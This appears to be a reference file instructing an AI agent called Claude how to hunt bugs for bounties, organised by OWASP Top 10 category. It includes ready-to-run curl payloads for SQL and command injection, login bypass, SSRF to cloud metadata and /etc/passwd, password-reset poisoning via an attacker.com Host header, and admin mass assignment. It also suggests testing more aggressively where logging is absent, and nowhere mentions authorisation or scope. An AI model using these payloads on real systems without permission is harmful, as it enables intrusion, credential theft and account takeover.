# OWASP Top 10 — Deep Testing Knowledge for AI Bug Bounty Hunter

When hunting, cross-reference EVERY endpoint against this knowledge base. Don't just run tools — THINK about what each endpoint does and which OWASP category it falls under.

---

## A01: Broken Access Control (#1 most common, highest bounty ROI)

**What:** Users can act outside their intended permissions.

**How Claude should test:**
1. **Horizontal IDOR** — Change user ID/UUID in every endpoint. Try sequential IDs, UUIDs from other users
2. **Vertical privilege escalation** — Access admin endpoints with regular user token
3. **Method-based** — If GET works, try PUT/DELETE/PATCH on same endpoint
4. **Force browsing** — Access `/admin`, `/internal`, `/debug`, `/api/v1/admin/*`
5. **Insecure direct reference** — Change file names, order IDs, invoice numbers
6. **Function-level** — Regular user calls admin-only API functions

**Key curl tests:**
```bash
# No auth
curl -s https://target.com/api/admin/users
# Other user's data
curl -s -H "Auth: Bearer $MY_TOKEN" https://target.com/api/users/$OTHER_USER_ID
# Method swap
curl -s -X DELETE -H "Auth: Bearer $MY_TOKEN" https://target.com/api/users/$OTHER_USER_ID
# Old API version (often has weaker auth)
curl -s -H "Auth: Bearer $MY_TOKEN" https://target.com/api/v1/admin/users
```

**Tool:** `auth_tester.py`, `exploit_verifier.py --type idor`

---

## A02: Cryptographic Failures

**What:** Sensitive data exposed due to weak/missing crypto.

**How Claude should test:**
1. **Data in transit** — HTTP instead of HTTPS, mixed content
2. **Weak algorithms** — MD5/SHA1 password hashes in responses
3. **Secrets in responses** — API keys, tokens, passwords in JSON/HTML
4. **JWT weaknesses** — None algorithm, weak signing key, exposed in URL
5. **Cookie without Secure/HttpOnly** — Session cookies over HTTP

**Key tests:**
```bash
# Check TLS
curl -v https://target.com 2>&1 | grep "SSL connection"
# Force HTTP to see if redirect happens
curl -v http://target.com 2>&1 | grep "Location:"
# Check what data API returns (PII?)
curl -s -H "Auth: Bearer $TOKEN" https://target.com/api/me | grep -i "password\|ssn\|credit\|secret"
```

**Tool:** `jwt_tester.py`, `git_dorker.py`

---

## A03: Injection (SQLi, NoSQLi, Command Injection, SSTI, LDAP, XPath)

**What:** User input executed as code/queries.

**How Claude should test:**
1. **SQLi** — `' OR 1=1--`, time-based: `' AND SLEEP(5)--`, error-based
2. **NoSQL** — `{"$gt":""}`, `{"$ne":""}` in JSON bodies
3. **Command injection** — `; id`, `| whoami`, `` `id` ``, `$(id)`
4. **SSTI** — `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` — if it returns 49, you have SSTI
5. **LDAP** — `*)(objectClass=*))`, `admin*`
6. **XPath** — `' or '1'='1`, `'] | //user/*[contains(pass,'`
7. **Header injection** — Inject in Host, X-Forwarded-For, Referer headers

**Where to inject:** EVERY parameter — query strings, POST body (JSON + form), headers, cookies, file names, file content

**Key tests:**
```bash
# SQLi detection
sqlmap -u "https://target.com/api/search?q=test" --batch --level 3
# SSTI
curl -s "https://target.com/page?name={{7*7}}" | grep "49"
# Command injection
curl -s "https://target.com/api/ping?host=127.0.0.1;id"
# NoSQL in JSON
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}' \
  https://target.com/api/login
```

**Tool:** `sqlmap`, `commix`, `exploit_verifier.py --type sqli/ssti`

---

## A04: Insecure Design (Business Logic Bugs)

**What:** Flaws in the design itself — no tool can find these. Claude MUST think creatively.

**How Claude should think:**
1. **Price manipulation** — Change price/quantity to negative/zero/99999
2. **Workflow bypass** — Skip steps (go from step 1 directly to step 5)
3. **Race conditions** — Parallel requests on financial operations (double-spend)
4. **Referral abuse** — Refer yourself, circular referrals
5. **Coupon/promo abuse** — Apply multiple times, negative amounts, expired codes
6. **Feature interaction** — Combine two legitimate features to create unintended behavior

**Key mental models:**
```
Ask: "What would happen if I..."
- ...send this request twice at the exact same time?
- ...change the currency after the price is calculated?
- ...apply a discount larger than the item price?
- ...cancel a transaction AFTER the refund is issued?
- ...transfer money to myself?
- ...change my email to another user's email?
```

**Tool:** `exploit_verifier.py --type race`, manual curl

---

## A05: Security Misconfiguration

**What:** Defaults, incomplete setup, open cloud storage, verbose errors, unnecessary features.

**How Claude should test:**
1. **Verbose errors** — Force errors, check if stack traces/DB info leak
2. **Default credentials** — admin/admin, admin/password on admin panels
3. **Unnecessary endpoints** — `/debug`, `/status`, `/health`, `/metrics`, `/actuator`
4. **Cloud storage** — Open S3 buckets, Azure blobs, GCP buckets
5. **CORS misconfig** — Overly permissive Access-Control-Allow-Origin
6. **Directory listing** — Browse directories on web server
7. **HTTP methods** — OPTIONS reveals allowed methods, try TRACE/TRACK

**Tool:** `cloud_enum.py`, `cors_tester.py`, `git_dorker.py`, `nuclei`

---

## A06: Vulnerable and Outdated Components

**What:** Known CVEs in libraries, frameworks, servers.

**How Claude should test:**
1. **Fingerprint** — `tech_profiler.py` identifies stack + versions
2. **CVE match** — Check version against known CVEs
3. **Nuclei scan** — 10K+ templates for known vulnerabilities
4. **JS libraries** — Old jQuery, Angular, React with known XSS

**Tool:** `tech_profiler.py`, `nuclei`, `cve_hunter.py`

---

## A07: Identification and Authentication Failures

**What:** Weak auth mechanisms.

**How Claude should test:**
1. **Credential stuffing** — No rate limiting on login
2. **Weak passwords** — No complexity requirements
3. **Session fixation** — Session ID doesn't change after login
4. **JWT flaws** — Algorithm confusion, none algo, weak key
5. **OAuth flaws** — redirect_uri bypass, state missing, scope escalation
6. **Password reset** — Token predictable, no expiration, host header poisoning
7. **2FA bypass** — Skip 2FA page, brute force OTP, response manipulation

**Key tests:**
```bash
# Password reset poisoning
curl -s -X POST https://target.com/api/reset-password \
  -H "Host: attacker.com" \
  -d "email=victim@target.com"
# 2FA bypass — access protected page directly
curl -s -H "Auth: Bearer $TOKEN" https://target.com/api/account
# after only completing step 1 of login (before 2FA)
```

**Tool:** `jwt_tester.py`, `oauth_tester.py`, `auth_tester.py`

---

## A08: Software and Data Integrity Failures

**What:** Assumptions about software updates, CI/CD pipelines, or deserialization.

**How Claude should test:**
1. **Insecure deserialization** — Manipulate serialized objects in cookies/parameters
2. **Mass assignment** — Send extra fields in registration/update: `{"role":"admin"}`
3. **CI/CD exposure** — `.github/workflows`, `Jenkinsfile`, `.gitlab-ci.yml` exposed
4. **Unsigned updates** — App accepts unsigned packages/plugins

**Key tests:**
```bash
# Mass assignment
curl -s -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test123","role":"admin","is_admin":true}'
# Check for CI/CD files
curl -s https://target.com/.github/workflows/deploy.yml
curl -s https://target.com/Jenkinsfile
```

---

## A09: Security Logging and Monitoring Failures

**What:** No logging, no alerts, no monitoring. Hard to exploit directly but indicates weak security posture.

**How it helps the hunter:** If there's no monitoring, you can test more aggressively without getting blocked.

---

## A10: Server-Side Request Forgery (SSRF)

**What:** Make the server request internal/external resources on your behalf.

**How Claude should test:**
1. **URL parameters** — `?url=`, `?image=`, `?import=`, `?webhook=`, `?proxy=`
2. **Cloud metadata** — `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. **Internal services** — `http://localhost:8080`, `http://internal-api:3000`
4. **Protocol smuggling** — `gopher://`, `dict://`, `file:///etc/passwd`
5. **IP bypasses** — `0x7f000001`, `2130706433`, `0177.0.0.1`, `127.1`
6. **DNS rebinding** — Use a domain that resolves to 127.0.0.1
7. **Blind SSRF** — Use interactsh/Burp Collaborator for OOB detection

**Key payloads:**
```bash
# Cloud metadata
curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
# Internal
curl "https://target.com/api/fetch?url=http://localhost:8080/admin"
# IP bypass
curl "https://target.com/api/fetch?url=http://0x7f000001/"
# Blind SSRF with interactsh
curl "https://target.com/api/fetch?url=http://YOUR_INTERACTSH_URL"
# File read
curl "https://target.com/api/fetch?url=file:///etc/passwd"
```

**Tool:** `exploit_verifier.py --type ssrf`, `interactsh-client`

---

## Priority Matrix for Bug Bounty

| OWASP Category | Bug Bounty Priority | Avg Payout | Tools Available |
|---|---|---|---|
| A01: Broken Access Control | 🔴 #1 | $2,000-$10,000 | auth_tester, exploit_verifier |
| A03: Injection | 🔴 #2 | $3,000-$25,000 | sqlmap, commix, exploit_verifier |
| A10: SSRF | 🔴 #3 | $2,000-$15,000 | exploit_verifier, interactsh |
| A07: Auth Failures | 🟡 #4 | $1,000-$5,000 | jwt_tester, oauth_tester |
| A04: Insecure Design | 🟡 #5 | $1,000-$10,000 | Manual (Claude thinking) |
| A05: Misconfiguration | 🟡 #6 | $500-$2,000 | cloud_enum, cors_tester, nuclei |
| A02: Crypto Failures | 🟢 #7 | $500-$2,000 | jwt_tester, git_dorker |
| A08: Integrity | 🟢 #8 | $500-$3,000 | Manual (mass assignment) |
| A06: Outdated Components | 🟢 #9 | $150-$1,000 | nuclei, tech_profiler |
| A09: Logging Failures | ⚪ #10 | Usually $0 | N/A |

**Always start with A01 (access control) — it's the highest ROI in bug bounty.**
